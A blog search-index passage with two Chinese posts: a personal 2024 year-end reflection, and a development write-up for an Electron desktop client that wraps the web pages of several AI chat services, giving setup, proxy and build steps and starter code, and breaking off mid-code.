<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小站杂货店-随心而行、稳中求进、抗争中接受</title>
      <link href="/2025/01/29/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E9%9A%8F%E5%BF%83%E8%80%8C%E8%A1%8C%E3%80%81%E7%A8%B3%E4%B8%AD%E6%B1%82%E8%BF%9B%E3%80%81%E6%8A%97%E4%BA%89%E4%B8%AD%E6%8E%A5%E5%8F%97/"/>
      <url>/2025/01/29/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E9%9A%8F%E5%BF%83%E8%80%8C%E8%A1%8C%E3%80%81%E7%A8%B3%E4%B8%AD%E6%B1%82%E8%BF%9B%E3%80%81%E6%8A%97%E4%BA%89%E4%B8%AD%E6%8E%A5%E5%8F%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/private/Chase_your_passion.jpg" data-caption="Chase_your_passion.jpg"><img src="/../images/private/Chase_your_passion.jpg" alt="Chase_your_passion.jpg"></a></p><h2 id="随心而行、稳中求进、抗争中接受"><a href="#随心而行、稳中求进、抗争中接受" class="headerlink" title="随心而行、稳中求进、抗争中接受"></a>随心而行、稳中求进、抗争中接受</h2><p>心血来潮想要对2024年做个总结，今年的变化和感受还是挺多的，无论是生活、工作还是思想上。坐在电脑前想要敲下文字记录下来时，键盘的删除键不断的来回，很多东西想说，但一切又显得那么的苍白，文学修养不高的我好像没有办法用文字准确的描述出个人心境……</p><br/><h3 id="生活上"><a href="#生活上" class="headerlink" title="生活上"></a><strong>生活上</strong></h3><p>这一年逐渐的感受到的命运奇妙，有好、有坏、有不甘、有不舍。其实很多时候就是时机不对，阴差阳错的错过一些事情，同时也会因为一些小变量得到意想不到的惊喜，就像古人那句话 “<strong>有心栽花花不开，无心插柳柳成荫</strong>”，大多数人都是被生活推着走的，好的、坏的不必介怀，学会接受就好，当然如果自己有能力改变的也必须要去尝试，命运也可以是运命。</p><p>这一年看的书籍不多，完整看完的就只有两本，《全球通史》、《杀死一只知更鸟》。知更鸟里面有一句话  <strong>“勇敢就是，在你没开始的时候就知道自己注定会输，但依然义无反顾地去做，并且不管发生什么都坚持到底”</strong>  当时读起来的时候感觉怪怪的，后面回想起来，也许有些事情结果并不是最重要的，过程的重要性往往被我们忽略掉，过程更多的是给自己的一个交代。</p><p>这一年值得让人深思或震撼的电影遇到的也不多，如果要推荐一部那就《大鱼》吧，剧情虽然荒诞，但最终回归现实，其中的隐喻还是值得思考的。—— <strong>“人有必须奋勇抗争的时候，也有必须接受命运安排的时候”。</strong></p><p>生活上的问题是不断的，不必事事要求完美，逐渐开始接受事情的不完美，残缺的回忆也是回忆，即便伤心也要坦然。</p><br/><h3 id="工作上"><a href="#工作上" class="headerlink" title="工作上"></a><strong>工作上</strong></h3><p>2024 更换了工作，工作内容与之前大体相当。市场总是在变化的，行情有好有坏，我们要主动求变，本身的能力要跟上市场的变化。没有找到你的事业之前，用心做好的你的职业。很多时候不是因为能力不行，而是缺少那个机会，但是获得机会的前提是你得具备拥有这个机会相当的能力。始终保持学习，适应职场上的变化，尽自己最大的能力做好本分的工作。</p><br/><h3 id="思想上"><a href="#思想上" class="headerlink" title="思想上"></a><strong>思想上</strong></h3><p>每个人的思想会随着生活的经历而改变，不同的生活经历自然衍生出不同的思想，不作比较，尊重他人的行为和习惯，接受思想上的差异。</p><p>以前的我是不信风水的，在家里摆一盘花、养个绿植就能改运，个人是感觉纯属瞎扯。现在发现其实有一些<strong>“风水”</strong>是建立在建筑学和地理学上的一门学科，理性看待还是有参考价值的。</p><p>举个例子：某些<strong>“风水大师”</strong>会建议在大厅放屏风，称能“防破财、保健康”。如果从建筑学角度看，可能因为房屋正对风口（如巷子），穿堂风过强，长期吹风易导致感冒，看病花钱便成了“破财”。而屏风恰好能阻挡气流，减少风寒，间接省了医药费——结果看似应验了“风水”说法。类似逻辑也适用于“人杰地灵”等概念。许多“玄学”背后可能隐藏环境、心理等现实因素，换一个角度解读，结论大不相同。保持开放思维，或许能发现更朴素的真相。</p><br/><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>2024 年就这样过去了，日子还在继续，故事仍在谱写，明年见！</p>]]></content>
      
      
      <categories>
          
          <category> 小站杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小站杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应用开发- Ai Talk 应用开发流程记录文档</title>
      <link href="/2025/01/21/Ai%20Talk%20%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/01/21/Ai%20Talk%20%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Ai Talk 项目是根据个人使用习惯编写的一款款平台的 AI 大模型对话客户端应用。可利用该框架构建任何属于自己的跨平台客户端，因为本质上只是将 Web 应用封装成客户端。</p><blockquote><p>项目地址：<a href="https://github.com/Funsiooo/Ai-Talk">https://github.com/Funsiooo/Ai-Talk</a></p></blockquote><h2 id="二、程序介绍"><a href="#二、程序介绍" class="headerlink" title="二、程序介绍"></a>二、程序介绍</h2><h3 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h3><p><strong>Ai Talk</strong> 是一款集合了多种大语言模型应用的开源桌面客户端，基于 Electron 构建。Electron 是一个由 GitHub 开发的开源框架，用于构建跨平台的桌面应用程序。它通过结合 <strong>Chromium</strong> 浏览器引擎和 <strong>Node.js</strong> 运行时环境，允许开发者使用 <strong>HTML、CSS 和 JavaScript</strong> 等前端技术开发桌面应用，同时支持调用底层系统功能（如文件系统、系统通知等）。当前支持以下大模型：OpenAI ChatGPT、Google Gemini、Quora Poe、月之暗面 Kimi、字节 豆包、阿里 通义千问、腾讯 元宝、百度 文心一言。 </p><blockquote><p>📑   <strong>Note：</strong> OpenAi ChatGPT、Google Gemini 、Quora Poe 需要设置网络代理才能正常访问（国外友人则无需代理）。</p></blockquote><h3 id="2-2-功能介绍"><a href="#2-2-功能介绍" class="headerlink" title="2.2 功能介绍"></a>2.2 功能介绍</h3><p><strong>界面：</strong> 程序主要由两部分组成：左侧的侧边栏和右侧的显示区域。点击左侧的某个大模型，右侧将加载该大模型的官方页面，即可开始对话。</p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/example1.png" data-caption="example1"><img src="/../images/ai/ai_talk/example1.png" alt="example1"></a></p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/example2.png" data-caption="example2"><img src="/../images/ai/ai_talk/example2.png" alt="example2"></a></p><p><strong>网络代理：</strong> 由于 <strong>OpenAI ChatGPT</strong> 、 <strong>Google Gemini</strong> 、<strong>Quora Poe</strong> 模型需要访问国外网站，因此在使用之前，需要在左侧侧边栏下方的 “网络设置” 中配置代理网络。目前只支持 <strong>HTTP</strong> 和 <strong>HTTPS</strong> 协议。配置步骤如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）点击 “网络设置” ，在弹窗输入代理地址，如：本地开启了 7890 端口为代理网络端口，填入 http://127.0.0.1:7890 </span><br><span class="line">2）点击 “设置代理” ，完成网络设置</span><br><span class="line">3）如网络设置输入错误，点击 “清除代理” 即可恢复程序默认设置</span><br><span class="line">4）设置完毕后点击 “关闭” </span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/example3.png" data-caption="example3"><img src="/../images/ai/ai_talk/example3.png" alt="example3"></a></p><h3 id="2-3-大模型使用规则"><a href="#2-3-大模型使用规则" class="headerlink" title="2.3 大模型使用规则"></a>2.3 大模型使用规则</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">| 模型名称        | 使用规则                                                     |</span><br><span class="line">| -------------- | ------------------------------------------------------------ |</span><br><span class="line">| 月之暗面 Kimi   | 消息条数限制：免费使用，不限次数。                           |</span><br><span class="line">| 通义千问        | 消息条数限制：免费使用，不限次数。                           |</span><br><span class="line">| 字节 豆包       | 消息条数限制：免费使用，不限次数。                           |</span><br><span class="line">| 腾讯 元宝       | 消息条数限制：免费使用，不限次数。                           |</span><br><span class="line">| 百度 文心一言    | 消息条数限制：3.5 模型免费使用，其它模型存在次数限制。         |</span><br><span class="line">| OpenAi ChatGPT | 消息条数限制：免费套餐用户在 5 小时内只能使用 GPT-4o 的有限次数，使用完毕回退其它模型，如：GPT-3.5 。【 官方文档链接：https://help.openai.com/en/articles/9275245-using-chatgpt-s-free-tier-faq#h_43513320b9】 |</span><br><span class="line">| Google  Gemini | 消息条数限制：1.5 flash 免费使用，存在次数限额，限额不详。【官方文档：https://gemini.google.com/faq】 |</span><br><span class="line">| Quora Poe      | 消息条数限制：存在次数限额，限额不详。                       |</span><br></pre></td></tr></table></figure></div><h3 id="2-4-源码启动"><a href="#2-4-源码启动" class="headerlink" title="2.4 源码启动"></a>2.4 源码启动</h3><ul><li>安装 nodejs</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nodejs.org/zh-cn/download</span><br></pre></td></tr></table></figure></div><ul><li>下载项目源码</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Funsiooo/Ai-Talk.git</span><br></pre></td></tr></table></figure></div><ul><li>安装 electron</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Ai-Talk</span><br><span class="line">npm install electron --save-dev -d --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>Ai Talk 目录下执行</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure></div><h3 id="2-5-打包"><a href="#2-5-打包" class="headerlink" title="2.5 打包"></a>2.5 打包</h3><ul><li>安装 node.js</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nodejs.org/zh-cn/download</span><br></pre></td></tr></table></figure></div><ul><li>下载项目源码</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Funsiooo/Ai-Talk.git</span><br></pre></td></tr></table></figure></div><ul><li>安装 electron</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Ai-Talk</span><br><span class="line">npm install electron --save-dev -d --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>安装 electron-forge&#x2F;cli</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev @electron-forge/cli -d --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>macos 安装 @electron-forge&#x2F;maker-dmg</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev  -d @electron-forge/maker-dmg --registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure></div><ul><li>Ai Talk 目录下执行，打包文件存放在 out 目录下（打包过程中若出现报错可忽略）</li></ul><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure></div><blockquote><p>📑   <strong>Note：</strong> 自行打包需要根据自身设备替换项目中的 package.json 文件, 目前提供 <strong>Mac Apple silicon</strong>、<strong>Windows</strong> 打包文件, 文件见 config 文件夹。</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/build.png" data-caption="build"><img src="/../images/ai/ai_talk/build.png" alt="build"></a></p><h2 id="三、开发流程"><a href="#三、开发流程" class="headerlink" title="三、开发流程"></a>三、开发流程</h2><h3 id="3-1-Electron-安装"><a href="#3-1-Electron-安装" class="headerlink" title="3.1 Electron 安装"></a>3.1 Electron 安装</h3><h4 id="3-1-1-Node-安装"><a href="#3-1-1-Node-安装" class="headerlink" title="3.1.1 Node 安装"></a>3.1.1 Node 安装</h4><blockquote><p> macOS 使用 brew 安装，win 直接官网下载安装即可</p></blockquote><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br><span class="line"></span><br><span class="line">funsiooo@macbook-pro ~ % node -v</span><br><span class="line">v23.3.0</span><br><span class="line">funsiooo@macbook-pro ~ % npm -v </span><br><span class="line">10.9.0</span><br></pre></td></tr></table></figure></div><h4 id="3-1-2-初始化-Electron-项目"><a href="#3-1-2-初始化-Electron-项目" class="headerlink" title="3.1.2 初始化 Electron 项目"></a>3.1.2 初始化 Electron 项目</h4><p>1）创建项目目录,使用 npm 初始化项目</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir Ai_Talk</span><br><span class="line">cd Ai_Talk</span><br><span class="line">npm init -y</span><br></pre></td></tr></table></figure></div><p>2）项目中安装 Electron，可能会存在网络问题，建议 npm 设置国内源，有条件代理的直接全局代理</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1）设置 npm 源</span><br><span class="line">npm config set registry https://registry.npmmirror.com# 使用淘宝镜像</span><br><span class="line">npm config set registry https://registry.npmjs.org# 恢复回默认的 npm 官方镜像</span><br><span class="line"></span><br><span class="line">2）electron 安装，选当前目录下安装即可</span><br><span class="line">npm install electron --save-dev-d# 在创建的项目文件夹内安装</span><br><span class="line">npm install -g electron -d# 全局安装，即安装在本级上</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/build2.png" data-caption="build"><img src="/../images/ai/ai_talk/build2.png" alt="build"></a></p><p>3）构建第一个程序</p><p>官方教程：<a href="https://www.electronjs.org/zh/docs/latest/tutorial/tutorial-first-app">https://www.electronjs.org/zh/docs/latest/tutorial/tutorial-first-app</a> , 项目文件如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">├── index.html              # 主页面</span><br><span class="line">├── main.js                 # 主进程入口文件</span><br><span class="line">├── node_modules            # Electron 项目依赖</span><br><span class="line">├── package-lock.json       # NPM 锁定文件</span><br><span class="line">└── package.json            # 项目依赖及元数据</span><br></pre></td></tr></table></figure></div><blockquote><p>index.html</p></blockquote><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">      <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">      <span class="attr">http-equiv</span>=<span class="string">&quot;X-Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello from Electron renderer!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello from Electron renderer!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>👋<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./renderer.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p> main.js</p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createWindow</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">600</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  win.<span class="title function_">loadFile</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createWindow</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div><blockquote><p>package.json</p></blockquote><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-electron-app&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello World!&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jane Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;electron&quot;</span><span class="punctuation">:</span> <span class="string">&quot;23.1.3&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>启动程序</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/build3.png" data-caption="build"><img src="/../images/ai/ai_talk/build3.png" alt="build"></a></p><h3 id="3-2-本项目开发流程"><a href="#3-2-本项目开发流程" class="headerlink" title="3.2 本项目开发流程"></a>3.2 本项目开发流程</h3><h4 id="3-2-1-项目文件树"><a href="#3-2-1-项目文件树" class="headerlink" title="3.2.1 项目文件树"></a>3.2.1 项目文件树</h4><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Ai-Talk/                     # 项目根目录</span><br><span class="line">├── LICENSE                  # 开源许可证</span><br><span class="line">├── README.md                # 项目说明文档</span><br><span class="line">├── assets/                  # 静态资源目录</span><br><span class="line">├── config/                  # 打包文件目录</span><br><span class="line">│   ├── macos/               # macOS 平台打包配置文件目录</span><br><span class="line">│   │   └── package.json     # macOS 平台打包配置文件</span><br><span class="line">│   └── windows/             # Windows 平台打包配置文件目录</span><br><span class="line">│       ├── css.zip          # 样式压缩包，mac与windows样式差异，win打包可替换该css</span><br><span class="line">│       └── package.json     # Windows 平台打包配置文件</span><br><span class="line">├── doc/                     # 文档目录</span><br><span class="line">│   └── README_EN.md         # 英文项目说明文档</span><br><span class="line">├── forge.config.js          # Electron Forge 配置文件</span><br><span class="line">├── main.js                  # 主进程入口文件</span><br><span class="line">├── package-lock.json        # NPM 锁定文件</span><br><span class="line">├── package.json             # 项目依赖及元数据</span><br><span class="line">└── src/                     # 源代码目录</span><br><span class="line">    ├── css/                 # 样式文件目录</span><br><span class="line">    │   ├── proxy.css        # 代理设置相关样式</span><br><span class="line">    │   ├── second.css       # 程序对话页面样式</span><br><span class="line">    │   ├── style.css        # 主页面通用样式</span><br><span class="line">    │   └── version.css      # 关于程序页面样式</span><br><span class="line">    ├── js/                  # 脚本文件目录</span><br><span class="line">    │   ├── preload.js       # 预加载脚本</span><br><span class="line">    │   └── renderer.js      # 渲染进程脚本</span><br><span class="line">    └── view/                # HTML 文件目录</span><br><span class="line">        ├── about.html       # 关于程序页面</span><br><span class="line">        ├── index.html       # 主页面</span><br><span class="line">        ├── proxy.html       # 代理弹窗页面</span><br><span class="line">        └── second.html      # 程序对话页面</span><br></pre></td></tr></table></figure></div><h4 id="3-2-2-程序核心流程"><a href="#3-2-2-程序核心流程" class="headerlink" title="3.2.2 程序核心流程"></a>3.2.2 程序核心流程</h4><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/1.png" data-caption="flow"><img src="/../images/ai/ai_talk/1.png" alt="flow"></a></p><ul><li><strong>main.js:</strong> 主进程入口，负责创建窗口、管理应用生命周期和处理系统交互。需要展示如何创建BrowserWindow实例，加载页面，以及处理IPC事件。</li><li><strong>Preload.js:</strong> 预加载脚本，作为主进程和渲染进程之间的桥梁，暴露有限的Node.js功能给渲染进程。需要说明contextBridge和ipcRenderer的使用。</li><li><strong>index.html:</strong> 主页面模板，渲染进程加载的HTML结构。需要包含对渲染脚本的引用，并展示如何调用预加载的API。 </li><li><strong>Renderer.js:</strong> 渲染进程脚本，处理用户界面交互，通过预加载脚本与主进程通信。需要事件监听和更新UI的示例。</li></ul><h4 id="3-2-3-主要功能"><a href="#3-2-3-主要功能" class="headerlink" title="3.2.3 主要功能"></a>3.2.3 主要功能</h4><p><strong>官方Web服务集成</strong></p><ul><li>采用 Electron <code>WebView</code> 组件无缝加载官方网页，实现跨平台封装（无需重复开发 UI&#x2F;交互逻辑）</li></ul><p><strong>对话分栏布局</strong></p><ul><li><strong>左侧面板</strong>：对话大模型选择、代理设置等功能</li><li><strong>右侧主界面</strong>：显示左侧选择的大模型官方页面，开启对话模式</li></ul><p><strong>网络代理模块</strong></p><ul><li>Electron <code>session.setProxy</code> API 实现代理设置功能</li></ul><h4 id="3-2-4-代码分析"><a href="#3-2-4-代码分析" class="headerlink" title="3.2.4 代码分析"></a>3.2.4 代码分析</h4><blockquote><p><strong>main.js 分析</strong></p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 